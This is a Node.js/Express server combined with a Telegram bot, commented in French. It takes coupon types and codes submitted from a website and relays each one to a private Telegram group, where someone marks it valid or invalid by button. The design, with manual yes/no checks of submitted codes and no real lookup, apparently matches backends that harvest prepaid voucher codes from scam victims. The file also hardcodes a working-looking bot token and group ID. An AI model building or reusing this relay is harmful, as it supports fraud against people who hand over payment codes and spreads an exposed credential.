// Backend Node.js/Express + Bot Telegram fusionné
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;
app.use(cors());
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = '8330769234:AAGiGPXFAl13nE7rR44v6MlKhAiuS6sznZM';
const GROUP_ID = -5214080706; // Remplacez par votre group ID
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Stockage temporaire en mémoire partagé
const codes = {};

// Endpoint pour enregistrer la demande de validation (depuis le site)
app.post('/api/request', async (req, res) => {
  const { code, type, requestId } = req.body;
  if (!code || !type || !requestId) return res.status(400).json({ ok: false });
  codes[requestId] = { code, type, status: 'pending' };
  // Envoi du message Telegram avec boutons OUI/NON
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ OUI', callback_data: `OUI|${requestId}` },
          { text: '❌ NON', callback_data: `NON|${requestId}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };
  try {
    await bot.sendMessage(GROUP_ID, `🔎 Nouveau coupon à vérifier\n\nType : <b>${type}</b>\nCode : <b>${code}</b>\n\nCliquez sur OUI ou NON pour valider ce coupon.`, opts);
    res.json({ ok: true });
  } catch (e) {
    console.error('Erreur envoi Telegram:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});

// Commande Telegram /coupon TYPE|CODE|requestId (optionnel)
bot.onText(/\/coupon (.+)/, (msg, match) => {
  const [type, code, requestId] = match[1].split('|');
  const opts = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: '✅ OUI', callback_data: `OUI|${requestId}` },
          { text: '❌ NON', callback_data: `NON|${requestId}` }
        ]
      ]
    },
    parse_mode: 'HTML'
  };
  bot.sendMessage(GROUP_ID, `🔎 Nouveau coupon à vérifier\n\nType : <b>${type}</b>\nCode : <b>${code}</b>\n\nCliquez sur OUI ou NON pour valider ce coupon.`, opts);
});


// Validation via API (depuis le bot OU Telegram)
app.post('/api/validate', async (req, res) => {
  const { requestId, result } = req.body;
  console.log('[VALIDATE] Reçu:', { requestId, result });
  if (!codes[requestId]) {
    console.log('[VALIDATE] Pas trouvé:', requestId);
    return res.status(404).json({ ok: false });
  }
  codes[requestId].status = result === 'OUI' ? 'valid' : 'invalid';
  console.log('[VALIDATE] Statut mis à jour:', codes[requestId]);
  res.json({ ok: true });
});

// Validation via Telegram bouton OUI/NON
bot.on('callback_query', async (query) => {
  const [result, requestId] = query.data.split('|');
  if (!codes[requestId]) {
    bot.answerCallbackQuery(query.id, { text: 'Code expiré ou inconnu.' });
    return;
  }
  codes[requestId].status = result === 'OUI' ? 'valid' : 'invalid';
  bot.answerCallbackQuery(query.id, { text: `Réponse enregistrée: ${result}` });
  bot.editMessageText(`Coupon ${requestId} validé: ${result === 'OUI' ? '✅ OUI' : '❌ NON'}`, {
    chat_id: query.message.chat.id,
    message_id: query.message.message_id
  });
});

// Endpoint pour le site : vérifier le statut
app.get('/api/status/:requestId', (req, res) => {
  const { requestId } = req.params;
  if (!codes[requestId]) {
    console.log('[STATUS] notfound', requestId);
    return res.json({ status: 'notfound' });
  }
  console.log('[STATUS]', requestId, '->', codes[requestId].status);
  res.json({ status: codes[requestId].status });
});

app.listen(port, () => {
  console.log('API + Bot listening on port', port);
});
